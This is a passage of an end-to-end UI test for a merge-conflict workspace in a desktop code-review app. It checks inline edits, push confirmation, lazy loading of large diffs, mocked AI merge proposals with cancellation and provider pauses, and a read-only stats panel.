    // yours and never marked. Undo brings the proposal back, with its mark and its count.
    await editInline(0, '// checked by hand\n');
    await wait(`${block(0)}?.dataset.state==='edited'`);
    await marksAre(prDiff, [combined]);
    assert.equal(
      await js(`${block(0)}.querySelector('.conflict-written-legend')?.textContent`),
      '1 line written by structural merge (neither side had it)'
    );
    assert.ok(
      await js<boolean>(
        `[...document.querySelectorAll('${prDiff} diffs-container')].flatMap(h=>[...(h.shadowRoot?.querySelectorAll('[data-line]')??[])]).some(r=>r.textContent.includes('// checked by hand')&&!r.hasAttribute('data-written-line'))`
      ),
      'The typed line shows, unmarked'
    );
    await captureAll('written-lines-inline-edit');
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='proposal'`);
    await marksAre(prDiff, [combined]);
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    await checksDone();
    // The union waits for a choice of yours (fail closed): use it, then the file can be marked reviewed.
    await js(`${block(1)}.querySelector('[data-choice=proposal]').click()`);
    await wait(`${block(1)}?.dataset.bucket==='decided'`);
    // The push confirmation marks the same line in the group that holds it.
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    for (const group of ['decided', 'merged'])
      await js(
        `(()=>{const d=document.querySelector('[data-confirm-group=${group}] .conflict-disclosure');if(d&&d.getAttribute('aria-expanded')!=='true')d.click()})()`
      );
    await marksAre('.conflict-confirm', [combined]);
    assert.match(
      await js<string>("[...document.querySelectorAll('.conflict-confirm [data-confirm-how]')].map(e=>e.textContent).join('|')"),
      /Conflict 1 of 2 · [^|]* · 1 line written by structural merge \(neither side had it\)/
    );
    await captureAll('written-lines-confirm');
    await click('Close');
    // A clean merge of 300 files: Arriving from main opens at once and mounts only the files in view.
    const many = Array.from(
      { length: 300 },
      (_, i) => `diff --git a/src/f${i}.ts b/src/f${i}.ts\n--- a/src/f${i}.ts\n+++ b/src/f${i}.ts\n@@ -1 +1 @@\n-export const v = ${i};\n+export const v = ${i + 1};\n`
    ).join('');
    await js(`(()=>{
      window.conflictPreview=${JSON.stringify(parsePatchFiles(many).flatMap((p) => p.files))};
      Object.assign(window.conflictFixture,{version:1,files:[],preparation:'clean-merge'});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait("document.querySelector('.conflict-state h2')?.textContent==='Git merged everything cleanly'");
    const started = Date.now();
    await click('Review and push…');
    await wait(
      "document.querySelector('[data-confirm-arriving] .conflict-diff-file diffs-container')?.shadowRoot?.querySelector('[data-line]')"
    );
    withinPerf('conflict confirmation, 300 files from main: open to the first diff', Date.now() - started, perfBudget(1500));
    assert.deepEqual(await confirmGroupsShown(), { main: { count: '300 files', open: 'true' } });
    const mounted = await js<number>("document.querySelectorAll('[data-confirm-arriving] .conflict-diff-file').length");
    assert.ok(mounted > 0 && mounted < 30, `Only the files in view mount (${mounted} of 300)`);
    // The list is capped in height and scrolls on its own; the last file mounts once it scrolls into view.
    assert.ok(await js<boolean>("document.querySelector('[data-confirm-arriving]').getBoundingClientRect().height<=560.5"));
    await js("document.querySelector('[data-confirm-arriving]').scrollTop=1e7");
    await wait(
      "document.querySelector('[data-confirm-arriving] .conflict-diff-file[aria-label=\"src/f299.ts\"] diffs-container')?.shadowRoot?.querySelector('[data-line]')"
    );
    await waitSettled(win.webContents, 'conflict-confirm-arriving');
    await click('Close');
    await js("window.conflictFixture.preparation='conflicts'");
    // The confirmation with a long diff: the title and Push stay in view; the body scrolls.
    const long = Array.from({ length: 160 }, (_, i) => `export const value${i} = ${i};`);
    const confirmPatch = `diff --git a/src/values.ts b/src/values.ts\n--- a/src/values.ts\n+++ b/src/values.ts\n@@ -1,160 +1,160 @@\n${long.map((l) => `-${l}\n+${l.replace(';', ' + 1;')}`).join('\n')}\n`;
    await js(`(()=>{
      window.conflictPreview=${JSON.stringify(parsePatchFiles(confirmPatch).flatMap((p) => p.files))};
      Object.assign(window.conflictFixture,{version:1,baseRepo:'klang/engine',files:[{path:'src/retry.ts',mode:'100644',base:'a\\n',ours:'b\\n',theirs:'c\\n',original:'<<<<<<< feature/retry\\nb\\n=======\\nc\\n>>>>>>> main\\n',result:'b\\nc\\n',resolved:true,source:'manual'}]});
      window.conflictCalls=[];
    })()`);
    await open();
    await click('Review and push…');
    await wait("document.activeElement?.classList.contains('step-card-body')");
    // The long file arrives from main: open its group.
    await js("document.querySelector('[data-confirm-group=main] .conflict-disclosure').click()");
    await wait(
      "document.querySelector('[data-confirm-group=main] .conflict-diff-file[aria-label=\"src/values.ts\"] diffs-container')?.shadowRoot?.querySelector('[data-line]')"
    );
    const inView = () =>
      js<boolean>(
        `(()=>{const d=document.querySelector('.conflict-confirm').getBoundingClientRect();const t=document.querySelector('.conflict-confirm .step-card-title').getBoundingClientRect();const p=(${visibleButton('Push merge commit')}).getBoundingClientRect();return t.top>=d.top-0.5&&p.bottom<=d.bottom+0.5})()`
      );
    assert.ok(await inView(), 'The title and Push are in view');
    await js("document.querySelector('.conflict-confirm .step-card-body').scrollTop=1e6");
    assert.ok(await inView(), 'They stay in view at the end of the diff');
    await shot('p1-confirm-long', true);
    await resize(760, 800);
    assert.ok(await inView(), 'And in a narrow window');
    await resize(1280, 900);
    await click('Close');

    // The model, per conflict (#445 items 6 and 7), with a mocked provider that answers when the test says so. Nothing is
    // sent until you ask; then each card shows both sides with a placeholder; proposals arrive one by one; your choice
    // cancels a pending request; a provider pause says so. No model is called.
    const modelOriginal =
      'export function retryDelay(attempt: number) {\n<<<<<<< feature/retry\n  return Math.min(attempt * 200, 5000);\n||||||| ancestor\n  return attempt * 200;\n=======\n  return Math.max(100, attempt * 200);\n>>>>>>> main\n}\n<<<<<<< feature/retry\nexport const retries = 5;\n=======\nexport const retries = 3;\n>>>>>>> main\n';
    const modelFile = {
      path: 'src/retry.ts',
      mode: '100644',
      base: 'export function retryDelay(attempt: number) {\n  return attempt * 200;\n}\nexport const retries = 4;\n',
      ours: 'export function retryDelay(attempt: number) {\n  return Math.min(attempt * 200, 5000);\n}\nexport const retries = 5;\n',
      theirs: 'export function retryDelay(attempt: number) {\n  return Math.max(100, attempt * 200);\n}\nexport const retries = 3;\n',
      original: modelOriginal,
      result: modelOriginal,
      resolved: false,
      source: 'manual',
    };
    const modelSession = async () => {
      await js(`(()=>{
        Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false,version:1,restack:undefined,dependents:[],lastPush:undefined,files:[${JSON.stringify(modelFile)}]});
        window.conflictCalls=[];window.modelAsks=[];window.modelCancels=[];window.modelAnswer={};window.refuseModel=undefined;
      })()`);
    };
    await js(`(()=>{
      window.electronAPI.conflictModel=req=>new Promise(resolve=>{window.modelAsks.push(req);window.modelAnswer[req.index]=resolve;});
      // Cancelling only records: a late answer can still arrive, as from a slow provider.
      window.electronAPI.cancelConflictModel=async req=>{window.modelCancels.push(req);};
      const inner=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        if(req.kind!=='model')return inner(req);
        window.conflictCalls.push(req);const s=window.conflictFixture;
        if(req.version!==s.version)throw Error('The saved resolution changed. Reopen the workspace before continuing.');
        if(window.refuseModel===req.index)throw Error("Error invoking remote method 'conflict-resolution': Error: This conflict changed, so the proposal wasn’t used.");
        const {spliceModelProposal}=await import('/lib/conflict-model.ts');
        const f=s.files.find(f=>f.path===req.path);
        const spliced=spliceModelProposal(f,req.index,{source:'model',text:'  return Math.min(Math.max(100, attempt * 200), 5000);\\n',by:'Claude',note:'Keeps the PR’s cap and main’s floor.',intents:{pr:'The PR caps the delay at 5 seconds.',main:'Main adds a 100 ms floor.'}});
        if(!spliced)throw Error('You already decided this conflict, so the proposal wasn’t used.');
        Object.assign(f,spliced,{resolved:false});s.version++;return {session:structuredClone(s)};
      };
    })()`);
    // Asking about every open conflict is the first entry of the one Ask menu (#445 distill).
    const askMenu = async (open: boolean) => {
      if (open) {
        await wait("document.querySelector('.conflict-suggest-trigger:not(:disabled)')");
        if (!(await js<boolean>("!!document.querySelector('.conflict-suggest-menu')")))
          await js("document.querySelector('.conflict-suggest-trigger').click()");
        await wait("!!document.querySelector('.conflict-suggest-menu')");
      } else if (await js<boolean>("!!document.querySelector('.conflict-suggest-menu')")) {
        await js("document.querySelector('.conflict-suggest-menu').dispatchEvent(new KeyboardEvent('keydown',{key:'Escape',bubbles:true}))");
        await wait("!document.querySelector('.conflict-suggest-menu')");
      }
    };
    /** The menu's offer to ask about every open conflict, or null. */
    const askOffer = async () => {
      await askMenu(true);
      const text = await js<string | null>("document.querySelector('[data-conflict-ask-model]')?.textContent ?? null");
      await askMenu(false);
      return text;
    };
    const waitOffer = async (test: (text: string | null) => boolean) => {
      for (let n = 0; n < 200; n++) if (test(await askOffer())) return;
      throw new Error(`Timed out waiting for the Ask offer: ${await askOffer()}`);
    };
    const askModel = async () => {
      await askMenu(true);
      await wait("document.querySelector('[data-conflict-ask-model]')");
      await js("document.querySelector('[data-conflict-ask-model]').click()");
    };
    /** Answers the workspace has received and handled, used or not. */
    const answers = () => js<number>("Number(document.querySelector('.conflict-workspace')?.dataset.modelAnswers ?? 0)");
    /** Delivers an answer and waits until the workspace has handled it. */
    const answer = async (index: number, outcome: string) => {
      const before = await answers();
      await js(`window.modelAnswer[${index}](${outcome})`);
      await wait(`Number(document.querySelector('.conflict-workspace')?.dataset.modelAnswers ?? 0)>${before}`);
    };
    const showTab = async (name: string) => {
      await js(
        `(()=>{const t=[...document.querySelectorAll('.pr-overview-tabs [role=tab]')].find(t=>t.checkVisibility()&&t.textContent===${JSON.stringify(name)});t.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,button:0}));t.click();})()`
      );
      // The view is hidden on another tab, never removed; on Conflicts it is visible again.
      await wait(
        name === 'Conflicts'
          ? "document.querySelector('.conflict-workspace')?.checkVisibility()"
          : "document.querySelector('.conflict-workspace') && !document.querySelector('.conflict-workspace').checkVisibility()"
      );
    };
    const modelLine = (index: number) => js<string | null>(`${block(index)}?.querySelector('.conflict-model-line')?.dataset.model ?? null`);
    await modelSession();
    await open();
    await wait("document.querySelector('.conflict-block[data-conflict-index=\"1\"]')");
    await askMenu(true);
    assert.match(
      await js<string>("document.querySelector('[data-conflict-ask-model]').textContent"),
      /^Ask .+ about 2 conflicts$/
    );
    assert.equal(await js("!!document.querySelector('[data-conflict-ask-model] svg.lucide-bot')"), true, 'AI uses the Bot icon');
    await askMenu(false);
    // The view and its offer are on screen: nothing was sent with them.
    assert.equal(await js('window.modelAsks.length'), 0, 'Nothing is sent until you ask');
    assert.equal(await js("!!document.querySelector('.conflict-model-line')"), false);
    await capture('model-offer');
    await askModel();
    await wait('window.modelAsks.length===2');
    await waitOffer((text) => text === null);
    assert.deepEqual(
      await js('window.modelAsks.map(r=>[r.path,r.index])'),
      [
        ['src/retry.ts', 0],
        ['src/retry.ts', 1],
      ],
      'Every open conflict is asked about at once'
    );
    await wait(`${block(0)}?.querySelector('.conflict-model-line[data-model=asking]') && ${block(1)}?.querySelector('.conflict-model-line[data-model=asking]')`);
    // Both sides and the Keep actions are there while the model works: you can decide without waiting.
    for (const index of [0, 1]) {
      assert.equal(await js(`${block(index)}.dataset.state`), 'open');
      assert.equal(
        await js(`[...${block(index)}.querySelectorAll('.conflict-block-actions button')].every(b=>!b.disabled)`),
        true
      );
      assert.match(await js<string>(`${block(index)}.querySelector('.conflict-model-line').textContent`), /^Asking .+ for a proposal… You can decide now\.$/);
    }
    assert.equal(await js("!!document.querySelector('.conflict-model-line svg.lucide-bot')"), true, 'AI uses the Bot icon');
    await capture('model-asking');
    // Another PR tab only hides the view: nothing is cancelled, and a proposal that arrives meanwhile is used.
    await showTab('Summary');
    assert.equal(await js('window.modelCancels.length'), 0, 'Leaving the tab cancels nothing');
    await answer(0, "{status:'proposal'}");
    await showTab('Conflicts');
    await wait(`${block(0)}?.dataset.bucket==='check'`);
    assert.equal(await js('window.modelCancels.length'), 0);
    assert.equal(await calls('model'), 1);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-bucket').textContent`), /Check · Proposed by Claude/);
    assert.deepEqual(
      await js(`[...${block(0)}.querySelectorAll('.conflict-model-intents dd')].map(d=>d.textContent)`),
      ['The PR caps the delay at 5 seconds.', 'Main adds a 100 ms floor.', 'Keeps the PR’s cap and main’s floor.']
    );
    assert.equal(await js(`${block(0)}.dataset.bucket`), 'check', 'A model proposal is never Merged');
    assert.equal(await modelLine(1), 'asking', 'The other conflict still waits');
    await checksDone();
    assert.equal(await js(`${block(0)}.dataset.bucket`), 'check', 'Still Check after the checks');
    await capture('model-one-arrived');
    // Your choice on the second conflict cancels its request; its late answer, delivered and handled, is not used.
    await js(`${block(1)}.focus()`);
    await key('2');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    await wait("window.modelCancels.some(r=>r.index===1)");
    await answer(1, "{status:'proposal'}");
    assert.equal(await calls('model'), 1, 'A cancelled request’s proposal never reaches the draft');
    assert.equal(await js(`${block(1)}.dataset.state`), 'kept');
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.match(
      await js<string>("window.conflictFixture.files[0].result"),
      /return Math\.min\(Math\.max\(100, attempt \* 200\), 5000\);\n\}\nexport const retries = 3;\n$/
    );
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");

    // A question leaves the conflict to decide and says what was asked; a proposal the service refuses says why.
    await modelSession();
    await open();
    await askModel();
    await wait('window.modelAsks.length===2');
    await answer(0, "{status:'question',question:'Should the floor apply before the cap?'}");
    await wait(`${block(0)}?.querySelector('.conflict-model-line[data-model=question]')`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-model-line').textContent`), /asks: Should the floor apply before the cap\?$/);
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    await js('window.refuseModel=1');
    await answer(1, "{status:'proposal'}");
    await wait(`${block(1)}?.querySelector('.conflict-model-line[data-model=failed]')`);
    assert.equal(
      await js(`${block(1)}.querySelector('.conflict-model-line').textContent`),
      'This conflict changed, so the proposal wasn’t used.'
    );
    assert.equal(await js(`${block(1)}.dataset.state`), 'open');
    // A failure can be asked about again.
    await waitOffer((text) => !!text?.endsWith('about 1 conflict'));
    // Preparing the merge again forgets the cards: they belonged to the old merge.
    await click('Start over with latest code…');
    await click('Start over');
    await wait("!document.querySelector('.conflict-model-line')");
    await waitOffer((text) => !!text?.endsWith('about 2 conflicts'));
    // Closing cancels what is still running.
    await askModel();
    await wait('window.modelAsks.length===4');
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await wait('window.modelCancels.filter(r=>r.index===0).length===1 && window.modelCancels.filter(r=>r.index===1).length===1');

    // A provider pause skips the model and says so, once, above the conflicts, until an answer arrives.
    await modelSession();
    await open();
    await askModel();
    await wait('window.modelAsks.length===2');
    for (const index of [0, 1])
      await answer(index, `{status:'paused',notice:'Claude is paused until 14:00.',until:${Date.now() + 3_600_000}}`);
    await wait("document.querySelector('[data-conflict-model-notice]')");
    assert.equal(
      await js("document.querySelector('[data-conflict-model-notice]').textContent"),
      'Claude is paused until 14:00. Gnosis didn’t ask it about these conflicts. Ask again after that, or decide them yourself.'
    );
    await wait(`!${block(0)}?.querySelector('.conflict-model-line') && !${block(1)}?.querySelector('.conflict-model-line')`);
    assert.equal(await calls('model'), 0);
    await captureAll('model-paused');
    // The limit reset: asking again works, and the notice leaves with the first answer.
    await askModel();
    await wait('window.modelAsks.length===4');
    await answer(0, "{status:'question',question:'Which floor?'}");
    await wait("!document.querySelector('[data-conflict-model-notice]')");
    // A pause whose time has passed leaves on its own.
    await answer(1, `{status:'paused',notice:'Claude is paused until 14:00.',until:${Date.now() + 1500}}`);
    await wait("document.querySelector('[data-conflict-model-notice]')");
    await wait("!document.querySelector('[data-conflict-model-notice]')");
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await js('window.electronAPI.conflictModel=undefined; window.electronAPI.cancelConflictModel=undefined');

    // Settings › Diagnostics › Conflict resolution stats shows the Merged undo count and rate, read-only, with Reset.
    const undone = await mergedUndone();
    assert.ok(undone >= 1);
    await js(`window.fixtureConflictStats.buckets.merged.shown=${undone * 4}`);
    await js(chooseWorkspaceMenuItem('[aria-label="Settings"]'));
    await wait("!!document.querySelector('[role=dialog] [role=tab]:not(.workspace-tab-select)')");
    // A tab switches on mousedown.
    await js(
      "[...document.querySelectorAll('[role=dialog] [role=tab]')].find(b=>b.textContent.trim()==='Diagnostics').dispatchEvent(new MouseEvent('mousedown',{bubbles:true,button:0}))"
    );
    await wait("!!document.querySelector('[data-testid=conflict-stats] tr[data-bucket=merged]')");
    assert.deepEqual(
      await js<string[]>(
        "[...document.querySelectorAll('[data-testid=conflict-stats] tr[data-bucket=merged] > *')].map(c=>c.textContent)"
      ),
      ['Merged', String(undone * 4), '0', String(undone), '0']
    );
    assert.equal(
      await js<string>("document.querySelector('[data-testid=conflict-merged-undo-rate]').textContent"),
      `Merged undo rate: 25% (${undone} of ${undone * 4} Merged conflicts undone).`
    );
    assert.equal(
      await js("document.querySelector('[data-testid=conflict-stats] tr[data-bucket=decide] td:nth-of-type(2)').textContent"),
      '—',
      'Decide has no proposal to accept'
    );
    assert.equal(
      await js("document.querySelectorAll('[data-testid=conflict-stats] input, [data-testid=conflict-stats] [role=switch]').length"),
      0,
      'Read-only'
    );
    await js("document.querySelector('#conflict-stats-title').scrollIntoView({block:'center'})");
    await capture('settings-conflict-stats');
    await js(
      "[...document.querySelectorAll('[data-testid=conflict-stats] button')].find(b=>b.textContent.trim()==='Reset').click()"
    );
    await wait("document.querySelector('[data-testid=conflict-merged-undo-rate]')?.textContent==='No Merged conflicts yet.'");
    assert.equal(await mergedUndone(), 0);
    console.log(
      'Conflict workspace passed: labelled versions, per-block undo, shortcuts, inline edit, one confirmation, outcome and failure copy, edge screens, stale guard, themes and narrow layout.'
    );
    app.exit(0);
  } catch (error) {
    console.error(error);
    await capture('test-failure');
    app.exit(1);
  }
});
